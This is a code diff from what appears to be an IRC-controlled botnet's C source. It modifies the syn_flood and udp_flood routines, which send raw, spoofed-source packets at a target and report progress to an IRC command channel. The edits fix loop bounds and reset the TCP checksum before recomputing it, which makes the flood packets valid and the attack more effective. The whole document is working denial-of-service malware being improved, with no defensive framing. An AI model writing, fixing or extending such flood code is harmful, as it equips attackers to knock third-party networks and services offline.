@@ -96,9 +96,9 @@ int syn_flood(attack_info *ainfo, irc_info *info) {
 	pseudo_h.tcp_len = htons(sizeof(struct tcphdr));
 
 	char msg[50];
-	for (int i = 0; i < ainfo->n_pkts; i++) {
+	for (int i = 1; i <= ainfo->n_pkts; i++) {
 
-		if (i % 100000 == 0) {
+		if (ainfo->n_pkts < 10 || (i % (ainfo->n_pkts/10) == 0)) {
 			sprintf(msg, "%d packets sent...", i);
 			irc_send(msg, strlen(msg), info);
 		}
@@ -118,10 +118,10 @@ int syn_flood(attack_info *ainfo, irc_info *info) {
 
 		// we must fill the pseudo header for computing cksum, this must be done at every packet sent
 		pseudo_h.saddr = iphdr->saddr;
+		tcphdr->check = 0;
 		// computes de checksum passing both pseudo header and tcp real header, note that pseudo header is not sent over the wire
-
 		tcphdr->check = tcp_csum((unsigned short *) &pseudo_h, (unsigned short *) tcphdr, sizeof(pseudo_h), sizeof(struct tcphdr));
-			if (sendto(fd_sock, buffer, iphdr->tot_len, 0, &destination, sizeof(struct sockaddr_in)) == -1) {
+		if (sendto(fd_sock, buffer, iphdr->tot_len, 0, &destination, sizeof(struct sockaddr_in)) == -1) {
 			perror("sending datagram");
 			exit(EXIT_FAILURE);
 		}
@@ -211,9 +211,9 @@ int udp_flood(attack_info *ainfo, irc_info *info) {
 	destination.sin_family = AF_INET;
 
 	char msg[50];
-	for (int i = 0; i < ainfo->n_pkts; i++) {
+	for (int i = 1; i <= ainfo->n_pkts; i++) {
 
-		if (i % 10 == 0) {
+		if (ainfo->n_pkts < 10 || (i % (ainfo->n_pkts/10) == 0)) {
 			sprintf(msg, "%d packets sent...", i);
 			irc_send(msg, strlen(msg), info);
 		}
